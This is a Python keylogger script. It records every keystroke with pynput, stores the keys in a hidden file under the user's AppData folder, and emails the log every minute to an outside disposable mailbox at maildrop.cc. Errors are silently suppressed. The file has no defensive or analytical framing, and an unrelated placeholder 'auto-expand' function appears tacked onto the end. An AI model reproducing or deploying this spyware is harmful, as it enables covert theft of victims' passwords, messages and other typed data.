
import os
import threading
import smtplib
from pynput import keyboard

# Directory to store logs
log_dir = os.path.join(os.getenv('APPDATA'), "logs")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "klog.txt")

log = ""

def send_logs():
    try:
        with open(log_file, "r", encoding="utf-8") as f:
            log_data = f.read()
        if log_data:
            server = smtplib.SMTP("smtp.maildrop.cc", 587)
            server.starttls()
            server.login("bndx9977@maildrop.cc", "fakepassword")  # Maildrop doesn't require login, placeholder only
            server.sendmail("bndx9977@maildrop.cc", "bndx9977@maildrop.cc", log_data)
            server.quit()
    except Exception:
        pass

def write_log():
    global log
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log)
    log = ""
    send_logs()
    timer = threading.Timer(60, write_log)
    timer.daemon = True
    timer.start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f"[{key}]"

write_log()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


# === AUTO-EXPAND HOOK ===
def expand():
    print(f'[AUTO_EXPAND] Module {__file__} has no custom logic. Placeholder activated.')
